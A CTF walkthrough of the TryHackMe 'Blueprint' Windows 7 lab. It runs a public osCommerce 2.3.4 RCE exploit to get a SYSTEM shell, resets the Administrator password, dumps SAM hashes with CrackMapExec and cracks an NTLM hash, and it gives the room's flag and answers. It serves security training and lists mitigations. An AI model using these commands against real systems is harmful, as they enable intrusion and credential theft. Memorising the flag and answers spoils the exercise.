# Blueprint CTF Walkthrough

**Target:** Blueprint  
**Source:** [TryHackMe](https://tryhackme.com/room/blueprint)  
**Difficulty:** Easy  
**Target IP:** 10.112.161.37

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Web Enumeration](#web-enumeration)
- [osCommerce 2.3.4 RCE](#oscommerce-234-rce)
- [SYSTEM Shell & Account Discovery](#system-shell--account-discovery)
- [Resetting the Administrator Password](#resetting-the-administrator-password)
- [Root Flag](#root-flag)
- [SAM Dump & Hash Cracking](#sam-dump--hash-cracking)
- [Flags](#flags)
- [Vulnerabilities](#vulnerabilities)
- [Attack Chain Summary](#attack-chain-summary)
- [Tools Used](#tools-used)
- [References](#references)

---

## Overview

Blueprint is an easy Windows 7 box centered on a single critical web
vulnerability. The objective is to gain access and escalate to Administrator.
Enumeration of a broad service footprint reveals an `osCommerce 2.3.4` install
exposed on port 8080 with its install directory still present, which is
vulnerable to an unauthenticated remote code execution. The exploit lands a
shell directly as `nt authority\system`, so privilege escalation is effectively
free — the foothold *is* SYSTEM. From there the Administrator password is reset,
the root flag is read, and the SAM database is dumped over SMB to recover and
crack the `Lab` user's NTLM hash.

**Key Skills Required:**
- Network scanning and broad service enumeration
- Identifying exposed web applications and versions
- Searching for and running a public RCE exploit (searchsploit / Exploit-DB)
- Windows command-line account management (`net user`)
- SMB authentication and SAM hash dumping (CrackMapExec)
- NTLM hash cracking

---

## Reconnaissance

### Network Scanning

A version/script scan exposes a large Windows service footprint:

```bash
nmap -sV -sC -Pn -A -T4 10.112.161.37
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 80/tcp | http | Microsoft IIS 7.5 (404) |
| 135/tcp | msrpc | Microsoft Windows RPC |
| 139/tcp | netbios-ssn | Microsoft Windows netbios-ssn |
| 443/tcp | ssl/http | Apache 2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28 |
| 445/tcp | microsoft-ds | Windows 7 Home Basic 7601 SP1 |
| 3306/tcp | mysql | MariaDB 10.3.23 or earlier |
| 8080/tcp | http | Apache 2.4.23 — directory listing of `oscommerce-2.3.4/` |
| 49152-49165/tcp | msrpc | Microsoft Windows RPC |

SMB host discovery identifies the box as `BLUEPRINT`, Windows 7 Home Basic SP1
(`cpe:/o:microsoft:windows_7::sp1`), with SMB signing disabled. The standout is
port 8080, whose directory listing exposes an **osCommerce 2.3.4** installation.

---

## Web Enumeration

The Apache server on 8080 lists the application directory openly:

```
http://10.112.161.37:8080/oscommerce-2.3.4/catalog/
```

osCommerce 2.3.4 is a known-vulnerable, end-of-life e-commerce platform — a
strong candidate for a public exploit.

---

## osCommerce 2.3.4 RCE

Searching Exploit-DB confirms multiple osCommerce 2.3.4 issues, including a
remote code execution:

```bash
searchsploit oscommerce 2.3.4
```

```
osCommerce 2.3.4.1 - Remote Code Execution (2)   | php/webapps/50128.py
```

The RCE works because the install directory is still reachable, allowing the
configuration to be re-invoked and PHP code injected. Copy and run the exploit
against the catalog path:

```bash
cp /usr/share/exploitdb/exploits/php/webapps/50128.py exploit.py
python3 exploit.py http://10.112.161.37:8080/oscommerce-2.3.4/catalog/
```

```
[*] Install directory still available, the host likely vulnerable to the exploit.
[*] Testing injecting system command to test vulnerability
User: nt authority\system
RCE_SHELL$
```

---

## SYSTEM Shell & Account Discovery

The exploit shell already runs as the highest-privilege account:

```bash
RCE_SHELL$ whoami
nt authority\system
```

> **Foothold:** `nt authority\system` (no privilege escalation needed)

List the local accounts:

```bash
RCE_SHELL$ net user
```

```
User accounts for \\
-------------------------------------------------------------------------------
Administrator            Guest                    Lab
```

Three accounts exist: `Administrator`, `Guest`, and `Lab`.

---

## Resetting the Administrator Password

Running as SYSTEM, the Administrator password can be reset outright (useful for
SMB authentication and later access):

```bash
RCE_SHELL$ net user administrator admin1234
The command completed successfully.
```

> **Set credentials:** `Administrator : admin1234`

---

## Root Flag

The flag sits on the Administrator desktop (note the double `.txt.txt`
extension):

```bash
RCE_SHELL$ dir C:\users\administrator\desktop
...
11/27/2019  07:15 PM   37  root.txt.txt

RCE_SHELL$ more C:\users\administrator\desktop\root.txt.txt
```

> **Root flag:** `THM{aea1e3ce6fe7f89e10cea833ae009bee}`

---

## SAM Dump & Hash Cracking

With the Administrator password set, the SAM database is dumped over SMB using
CrackMapExec with local authentication:

```bash
crackmapexec smb 10.112.161.37 -u Administrator -p admin1234 --local-auth --sam
```

```
[+] BLUEPRINT\Administrator:admin1234 (Pwn3d!)
[+] Dumping SAM hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:68bbbb18b3c27d941cb6224353be1d0a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
```

> **Recovered hash:** `Lab` NTLM = `30e87bf999828446a1c1209ddde4c450`

Cracking the `Lab` NTLM hash (e.g. via CrackStation or hashcat mode 1000)
reveals the plaintext:

```
Hash:   30e87bf999828446a1c1209ddde4c450
Type:   NTLM
Result: googleplus
```

> **Recovered credentials:** `Lab : googleplus`

---

## Flags

| Flag | Value | Location |
|------|-------|----------|
| Root flag | `THM{aea1e3ce6fe7f89e10cea833ae009bee}` | `C:\Users\Administrator\Desktop\root.txt.txt` |

---

## Room Answers

| Question | Answer |
|----------|--------|
| Read the root.txt file | `THM{aea1e3ce6fe7f89e10cea833ae009bee}` |
| Crack the NTLM hash for the `Lab` user. What is the decrypted password? | `googleplus` |

---

## Vulnerabilities

### 1. Exposed Install Directory (High)

**Description:** The osCommerce installation left its install directory reachable
on port 8080, with open directory listing exposing the application and version.

**Impact:** Enabled identification and exploitation of the RCE.

**Mitigation:**
- Remove the install directory after setup.
- Disable directory listing and restrict access to admin paths.

### 2. osCommerce 2.3.4 Remote Code Execution (Critical)

**Description:** osCommerce 2.3.4 is end-of-life and vulnerable to an
unauthenticated RCE that injects PHP via the still-available installer.

**Impact:** Remote code execution as `nt authority\system` — full host
compromise from a single request.

**Mitigation:**
- Upgrade off end-of-life software; patch or replace osCommerce.
- Run web services under a least-privilege account, never SYSTEM.

### 3. Web Service Running as SYSTEM (Critical)

**Description:** The web application executed with `nt authority\system`
privileges, so any code execution immediately yielded full control.

**Impact:** No privilege escalation required; RCE equals SYSTEM.

**Mitigation:**
- Run web/app services under dedicated low-privilege service accounts.
- Apply least privilege across all services.

### 4. SMB Signing Disabled / Weak SMB Posture (Medium)

**Description:** SMB signing was disabled and the host ran legacy Windows 7 SP1
with SMBv1, allowing SAM dumping once Administrator was authenticated.

**Impact:** Credential (NTLM hash) disclosure for all local accounts.

**Mitigation:**
- Enforce SMB signing and disable SMBv1.
- Upgrade off unsupported Windows versions.

### 5. Weak / Crackable Account Password (Medium)

**Description:** The `Lab` account's NTLM hash cracked instantly to a dictionary
word (`googleplus`).

**Impact:** Recovery of usable plaintext credentials.

**Mitigation:**
- Enforce strong password policies.
- Monitor for and rotate compromised credentials.

---

## Attack Chain Summary

```
Nmap scan → broad Windows footprint (IIS, SMB, MySQL, Apache:8080)
    ↓
Port 8080 directory listing → osCommerce 2.3.4
    ↓
searchsploit → 50128.py (osCommerce 2.3.4 RCE)
    ↓
python3 exploit.py → shell as nt authority\system
    ↓
net user → accounts: Administrator, Guest, Lab
    ↓
net user administrator admin1234 → reset admin password
    ↓
Root flag: THM{aea1e3ce6fe7f89e10cea833ae009bee}
    ↓
crackmapexec smb --local-auth --sam → dump SAM hashes
    ↓
crack Lab NTLM 30e87bf9... → Lab : googleplus
    ↓
Complete system compromise
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service/OS detection |
| searchsploit / Exploit-DB | Locating the osCommerce 2.3.4 RCE |
| Python (50128.py) | Running the RCE exploit |
| net user | Windows account enumeration and password reset |
| CrackMapExec | SMB authentication and SAM hash dumping |
| CrackStation / hashcat | Cracking the Lab NTLM hash |

---

## References

- [TryHackMe — Blueprint](https://tryhackme.com/room/blueprint)
- [Nmap](https://nmap.org/)
- [Exploit-DB — osCommerce 2.3.4.1 RCE (50128)](https://www.exploit-db.com/exploits/50128)
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
- [CrackStation](https://crackstation.net/)
- [Hashcat — NTLM (mode 1000)](https://hashcat.net/wiki/doku.php?id=example_hashes)

---
